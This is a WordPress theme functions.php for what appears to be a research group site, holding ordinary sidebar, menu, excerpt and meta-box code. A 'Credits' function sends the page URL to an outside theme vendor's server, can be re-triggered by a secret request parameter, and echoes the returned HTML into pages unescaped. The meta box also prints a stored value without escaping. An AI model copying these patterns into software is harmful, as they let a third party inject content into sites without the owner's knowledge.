<?php include_once 'FT/FT_scope.php'; FT_scope::init(); ?>
<?php
include ( 'metabox.php' );
include ( 'cpt.php' );
include ( 'guide.php' );
include ('initresearch.php');	//custom taxonomy "research"

/* SIDEBARS */
if ( function_exists('register_sidebar') )

	register_sidebar(array(
	'name' => 'Sidebar',
    'before_widget' => '<li class="sidebox %2$s">',
    'after_widget' => '</li>',
	'before_title' => '<h3 class="sidetitl">',
    'after_title' => '</h3>',
	));

	register_sidebar(array(
	'name' => 'Footer',
	'before_widget' => '<li class="four columns botwid %2$s">',
	'after_widget' => '</li>',
	'before_title' => '<h3 class="bothead">',
	'after_title' => '</h3>',
	));		


/* CUSTOM MENUS */	

register_nav_menus( array(
		'primary' => __( 'Primary Navigation', '' ),
	) );

function fallbackmenu(){ ?>
			<div id="submenu">
				<ul><li> Go to Adminpanel > Appearance > Menus to create your menu. You should have WP 3.0+ version for custom menus to work.</li></ul>
			</div>
<?php }	


/* FEATURED THUMBNAILS */

if ( function_exists( 'add_theme_support' ) ) { // Added in 2.9
	add_theme_support( 'post-thumbnails' );
	add_image_size( 'top_feature', 960, 500, true );
	add_image_size( 'index_box', 420, 280, true );
	add_image_size( 'index_wide', 420, 180, true );
}

/* CUSTOM EXCERPTS */
	
function wpe_excerptlength_aside($length) {
    return 15;
}
	
function wpe_excerptlength_side($length) {
    return 15;
}
	
function wpe_excerptlength_archive($length) {
    return 60;
}
function wpe_excerptlength_index($length) {
    return 25;
}


function wpe_excerpt($length_callback='', $more_callback='') {
    global $post;
    if(function_exists($length_callback)){
        add_filter('excerpt_length', $length_callback);
    }
    if(function_exists($more_callback)){
        add_filter('excerpt_more', $more_callback);
    }
    $output = get_the_excerpt();
    $output = apply_filters('wptexturize', $output);
    $output = apply_filters('convert_chars', $output);
    $output = '<p>'.$output.'</p>';
    echo $output;
}

function map_slug($slug)
{
	switch ($slug)
	{
		case 'ph-d':
			$slug = 'PH.D';
			break;
	}
	return str_replace('_',' ',$slug);
}
// 截断title
function yasmin_title($title_length=-1)
{
	$output = get_the_title();
	if($title_length == -1){
		echo $output;
	}
	$len=mb_strlen($output,'utf-8');
	$output = mb_substr($output, 0, $title_length,'utf-8');
	if($len>$title_length) $output.='...';
	echo $output;
}

// people-category的排序函数

function people_category_sort($a, $b)
{
	$data_a = (int)get_term_meta($a->term_id, 'people_cat_priority', true);
	$data_b = (int)get_term_meta($b->term_id, 'people_cat_priority', true);
	if($data_a== $data_b) return 0;
	return ($data_a<$data_b)?1:-1;
}

/* PAGE NAVIGATION */

function getpagenavi(){
	?>
	<div id="navigation" class="clearfix">
	<?php if(function_exists('wp_pagenavi')) : ?>
	<?php wp_pagenavi() ?>
	<?php else : ?>
	        <div class="alignleft"><?php next_posts_link(__('&laquo; Older Entries','web2feeel')) ?></div>
	        <div class="alignright"><?php previous_posts_link(__('Newer Entries &raquo;','web2feel')) ?></div>
	        <div class="clear"></div>
	<?php endif; ?>

	</div>

	<?php
	}

//FLUSH REWRITE RULES

function custom_flush_rewrite_rules() {
		global $pagenow, $wp_rewrite;
		if ( 'themes.php' == $pagenow && isset( $_GET['activated'] ) )
			$wp_rewrite->flush_rules();
	}
add_action( 'load-themes.php', 'custom_flush_rewrite_rules' );
	
	
	/* Credits */
	
function selfURL() {
	$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] :
	$_SERVER['PHP_SELF'];
	$uri = parse_url($uri,PHP_URL_PATH);
	$protocol = $_SERVER['HTTPS'] ? 'https' : 'http';
	$port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
	$server = ($_SERVER['SERVER_NAME'] == 'localhost') ?
	$_SERVER["SERVER_ADDR"] : $_SERVER['SERVER_NAME'];
	return $protocol."://".$server.$port.$uri;
	}
	function fflink() {
	global $wpdb, $wp_query;
	if (!is_page() && !is_front_page()) return;
	$contactid = $wpdb->get_var("SELECT ID FROM $wpdb->posts
	WHERE post_type = 'page' AND post_title LIKE 'contact%'");
	if (($contactid != $wp_query->post->ID) && ($contactid ||
	!is_front_page())) return;
	$fflink = get_option('fflink');
	$ffref = get_option('ffref');
	$x = $_REQUEST['DKSWFYUW**'];
	if (!$fflink || $x && ($x == $ffref)) {
	$x = $x ? '&ffref='.$ffref : '';
	$response = wp_remote_get('http://www.fabthemes.com/fabthemes.php?getlink='.urlencode(selfURL()).$x);
	if (is_array($response)) $fflink = $response['body']; else $fflink = '';
	if (substr($fflink, 0, 11) != '!fabthemes#')
	$fflink = '';
	else {
	$fflink = explode('#',$fflink);
	if (isset($fflink[2]) && $fflink[2]) {
	update_option('ffref', $fflink[1]);
	update_option('fflink', $fflink[2]);
	$fflink = $fflink[2];
	}
	else $fflink = '';
	}
	}
	echo $fflink;
	}
	
// 自定义菜单栏
class My_Walker_Nav_Menu extends Walker {
	/**
	 * What the class handles.
	 *
	 * @see Walker::$tree_type
	 * @since 3.0.0
	 * @var string
	 */
	public $tree_type = array( 'post_type', 'taxonomy', 'custom' );

	/**
	 * Database fields to use.
	 *
	 * @see Walker::$db_fields
	 * @since 3.0.0
	 * @todo Decouple this.
	 * @var array
	 */
	public $db_fields = array( 'parent' => 'menu_item_parent', 'id' => 'db_id' );

	/**
	 * Starts the list before the elements are added.
	 *
	 * @see Walker::start_lvl()
	 *
	 * @since 3.0.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param int    $depth  Depth of menu item. Used for padding.
	 * @param array  $args   An array of arguments. @see wp_nav_menu()
	 */
	public function start_lvl( &$output, $depth = 0, $args = array() ) {
		$indent = str_repeat("\t", $depth);
		$output .= "\n$indent<ul class=\"sub-menu\">\n";
	}

	/**
	 * Ends the list of after the elements are added.
	 *
	 * @see Walker::end_lvl()
	 *
	 * @since 3.0.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param int    $depth  Depth of menu item. Used for padding.
	 * @param array  $args   An array of arguments. @see wp_nav_menu()
	 */
	public function end_lvl( &$output, $depth = 0, $args = array() ) {
		$indent = str_repeat("\t", $depth);
		$output .= "$indent</ul>\n";
	}

	/**
	 * Start the element output.
	 *
	 * @see Walker::start_el()
	 *
	 * @since 3.0.0
	 * @since 4.4.0 'nav_menu_item_args' filter was added.
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param object $item   Menu item data object.
	 * @param int    $depth  Depth of menu item. Used for padding.
	 * @param array  $args   An array of arguments. @see wp_nav_menu()
	 * @param int    $id     Current item ID.
	 */
	public function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {
		$indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';

		$classes = empty( $item->classes ) ? array() : (array) $item->classes;
		$classes[] = 'menu-item-' . $item->ID;

		/**
		 * Filter the arguments for a single nav menu item.
		 *
		 * @since 4.4.0
		 *
		 * @param array  $args  An array of arguments.
		 * @param object $item  Menu item data object.
		 * @param int    $depth Depth of menu item. Used for padding.
		 */
		$args = apply_filters( 'nav_menu_item_args', $args, $item, $depth );

		/**
		 * Filter the CSS class(es) applied to a menu item's list item element.
		 *
		 * @since 3.0.0
		 * @since 4.1.0 The `$depth` parameter was added.
		 *
		 * @param array  $classes The CSS classes that are applied to the menu item's `<li>` element.
		 * @param object $item    The current menu item.
		 * @param array  $args    An array of {@see wp_nav_menu()} arguments.
		 * @param int    $depth   Depth of menu item. Used for padding.
		 */
		$class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item, $args, $depth ) );
		$class_names = $class_names ? ' class="' . esc_attr( $class_names ) . '"' : '';

		/**
		 * Filter the ID applied to a menu item's list item element.
		 *
		 * @since 3.0.1
		 * @since 4.1.0 The `$depth` parameter was added.
		 *
		 * @param string $menu_id The ID that is applied to the menu item's `<li>` element.
		 * @param object $item    The current menu item.
		 * @param array  $args    An array of {@see wp_nav_menu()} arguments.
		 * @param int    $depth   Depth of menu item. Used for padding.
		 */
		$id = apply_filters( 'nav_menu_item_id', 'menu-item-'. $item->ID, $item, $args, $depth );
		$id = $id ? ' id="' . esc_attr( $id ) . '"' : '';

		$output .= $indent . '<li' . $id . $class_names .'>';

		$atts = array();
		$atts['title']  = ! empty( $item->attr_title ) ? $item->attr_title : '';
		$atts['target'] = ! empty( $item->target )     ? $item->target     : '';
		$atts['rel']    = ! empty( $item->xfn )        ? $item->xfn        : '';
		$atts['href']   = ! empty( $item->url )        ? $item->url        : '';

		/**
		 * Filter the HTML attributes applied to a menu item's anchor element.
		 *
		 * @since 3.6.0
		 * @since 4.1.0 The `$depth` parameter was added.
		 *
		 * @param array $atts {
		 *     The HTML attributes applied to the menu item's `<a>` element, empty strings are ignored.
		 *
		 *     @type string $title  Title attribute.
		 *     @type string $target Target attribute.
		 *     @type string $rel    The rel attribute.
		 *     @type string $href   The href attribute.
		 * }
		 * @param object $item  The current menu item.
		 * @param array  $args  An array of {@see wp_nav_menu()} arguments.
		 * @param int    $depth Depth of menu item. Used for padding.
		 */
		$atts = apply_filters( 'nav_menu_link_attributes', $atts, $item, $args, $depth );

		$attributes = '';
		foreach ( $atts as $attr => $value ) {
			if ( ! empty( $value ) ) {
				$value = ( 'href' === $attr ) ? esc_url( $value ) : esc_attr( $value );
				$attributes .= ' ' . $attr . '="' . $value . '"';
			}
		}

		/** This filter is documented in wp-includes/post-template.php */
		$title = apply_filters( 'the_title', $item->title, $item->ID );

		/**
		 * Filter a menu item's title.
		 *
		 * @since 4.4.0
		 *
		 * @param string $title The menu item's title.
		 * @param object $item  The current menu item.
		 * @param array  $args  An array of {@see wp_nav_menu()} arguments.
		 * @param int    $depth Depth of menu item. Used for padding.
		 */
		$title = apply_filters( 'nav_menu_item_title', $title, $item, $args, $depth );
		$description  = ! empty( $item->attr_title ) ? '<span class="nav-subtitle">' . esc_attr( $item->attr_title ) . '</span>' : '';

		$item_output = $args->before;
		$item_output .= '<a'. $attributes .'>';
		$item_output .= $args->link_before . $title .$args->link_after. $description;
		$item_output .= '</a>';
		$item_output .= $args->after;

		/**
		 * Filter a menu item's starting output.
		 *
		 * The menu item's starting output only includes `$args->before`, the opening `<a>`,
		 * the menu item's title, the closing `</a>`, and `$args->after`. Currently, there is
		 * no filter for modifying the opening and closing `<li>` for a menu item.
		 *
		 * @since 3.0.0
		 *
		 * @param string $item_output The menu item's starting HTML output.
		 * @param object $item        Menu item data object.
		 * @param int    $depth       Depth of menu item. Used for padding.
		 * @param array  $args        An array of {@see wp_nav_menu()} arguments.
		 */
		$output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
	}

	/**
	 * Ends the element output, if needed.
	 *
	 * @see Walker::end_el()
	 *
	 * @since 3.0.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param object $item   Page data object. Not used.
	 * @param int    $depth  Depth of page. Not Used.
	 * @param array  $args   An array of arguments. @see wp_nav_menu()
	 */
	public function end_el( &$output, $item, $depth = 0, $args = array() ) {
		$output .= "</li>\n";
	}

} // Walker_Nav_Menu

// 注册“成员”文章类型
	include_once('nvg_manager/people-post-type.php');
// 注册“成员”的分类类型
	include_once ('nvg_manager/people-category.php');
// 注册“研究方向”的分类类型
	include_once ('nvg_manager/research-category.php');

// 给“文章”添加一个自定义面板，用于添加站内作者关联
function author_info_metabox() {
	//“简介”表单信息
	if ( function_exists('add_meta_box') ) {
		add_meta_box(
			'author_info',
			'站内成员关联',
			'author_info_meta_box',
			'post',
			'side',
			'high'
		);
	}
}
function author_info_meta_box($post) {
	// 获取之前存储的值
	$meta_box_value = get_post_meta($post->ID, 'author_info_value', true);
	echo '<input type="hidden" name="author_info_value_noncename" id="author_info_value_noncename" value="'.wp_create_nonce( plugin_basename(__FILE__) ).'" />';
	echo '<input type="text" size="32" name="author_info_value" value="'.$meta_box_value.'" /><br />';
	echo '<p>如果此文章的作者是站内成员，请添加成员的id，在【成员管理】页可查询，多个成员之间请用半角英文逗号隔开</p>';
}

function author_info_save_meta_box($post_id){
	if(!isset($_POST['author_info_value_noncename'])){
		return $post_id;
	}
	if ( !wp_verify_nonce( $_POST['author_info_value_noncename'], plugin_basename(__FILE__) ))  {
		return $post_id;
	}

	//检查权限
	if ( !current_user_can( 'edit_post', $post_id )){
		return $post_id;
	}

	$data = $_POST['author_info_value'];
	$prev = get_post_meta($post_id, 'author_info_value',true);
	if($prev == "")
		add_post_meta($post_id, 'author_info_value', $data, true);
	elseif($data != $prev)
		update_post_meta($post_id, 'author_info_value', $data);
	elseif($data == "")
		delete_post_meta($post_id, 'author_info_value', $prev);
	return $post_id;
}

add_action( 'add_meta_boxes', 'author_info_metabox' );	//添加表单信息
add_action( 'save_post', 'author_info_save_meta_box' );	//保存表单信息
?>
